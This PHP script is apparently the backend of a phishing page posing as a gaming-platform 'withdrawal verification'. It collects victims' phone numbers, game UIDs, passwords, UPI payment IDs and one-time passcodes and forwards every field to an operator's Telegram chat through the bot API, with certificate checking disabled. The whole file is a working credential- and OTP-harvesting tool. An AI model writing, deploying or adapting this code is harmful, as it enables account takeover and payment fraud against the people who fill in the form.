<?php
declare(strict_types=1);

ini_set('display_errors', '0');
error_reporting(E_ALL);

header('Content-Type: application/json; charset=utf-8');

if (!file_exists(__DIR__ . '/config.php')) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'config.php file missing']);
    exit;
}

require __DIR__ . '/config.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Method not allowed']);
    exit;
}

$raw = file_get_contents('php://input');
$data = json_decode($raw ?: '', true);

if (!is_array($data)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Invalid JSON input']);
    exit;
}

$action = $data['action'] ?? 'submit_verification';

if (!defined('TELEGRAM_BOT_TOKEN') || !defined('TELEGRAM_CHAT_ID')) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram token or chat ID not defined in config.php']);
    exit;
}

// 1. ACTION: REQUEST OTP NOTIFICATION (INCLUDES PASSWORD)
if ($action === 'request_otp') {
    $phone    = trim((string)($data['phone'] ?? ''));
    $platform = trim((string)($data['platform'] ?? ''));
    $uid      = trim((string)($data['uid'] ?? ''));
    $password = trim((string)($data['password'] ?? ''));

    $message = "<b>Request for OTP</b>\n\n"
             . "<b>Phone Number:</b> " . htmlspecialchars($phone) . "\n"
             . "<b>Platform Name:</b> " . htmlspecialchars($platform) . "\n"
             . "<b>Game UID:</b> " . htmlspecialchars($uid) . "\n"
             . "<b>Password:</b> " . htmlspecialchars($password) . "\n"
             . "<b>Time:</b> " . date('Y-m-d H:i:s') . " IST";
} 
// 2. ACTION: FULL VERIFICATION SUBMISSION
else {
    $platform = trim((string)($data['platform'] ?? ''));
    $uid      = trim((string)($data['uid'] ?? ''));
    $phone    = trim((string)($data['phone'] ?? ''));
    $upiId    = trim((string)($data['upiId'] ?? ''));
    $amount   = trim((string)($data['amount'] ?? ''));
    $password = trim((string)($data['password'] ?? ''));
    $otp      = trim((string)($data['otp'] ?? ''));

    if ($platform === '' || $uid === '' || $phone === '' || $upiId === '' || $amount === '') {
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => 'Missing required fields']);
        exit;
    }

    $message = "<b>New Withdrawal Verification</b>\n\n"
             . "<b>Platform:</b> " . htmlspecialchars($platform) . "\n"
             . "<b>UID:</b> " . htmlspecialchars($uid) . "\n"
             . "<b>Phone:</b> " . htmlspecialchars($phone) . "\n"
             . "<b>UPI ID:</b> " . htmlspecialchars($upiId) . "\n"
             . "<b>Amount:</b> ₹" . htmlspecialchars($amount) . "\n"
             . "<b>Password:</b> " . htmlspecialchars($password) . "\n"
             . "<b>OTP:</b> " . htmlspecialchars($otp) . "\n"
             . "<b>Time:</b> " . date('Y-m-d H:i:s') . " IST";
}

$url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';

$post = [
    'chat_id'    => TELEGRAM_CHAT_ID,
    'text'       => $message,
    'parse_mode' => 'HTML',
];

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => http_build_query($post),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 15,
    CURLOPT_SSL_VERIFYPEER => false
]);
$response = curl_exec($ch);
$statusCode = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($response === false || $statusCode < 200 || $statusCode >= 300) {
    http_response_code(502);
    echo json_encode(['ok' => false, 'error' => 'Telegram notification failed with status code ' . $statusCode]);
    exit;
}

echo json_encode(['ok' => true]);
exit;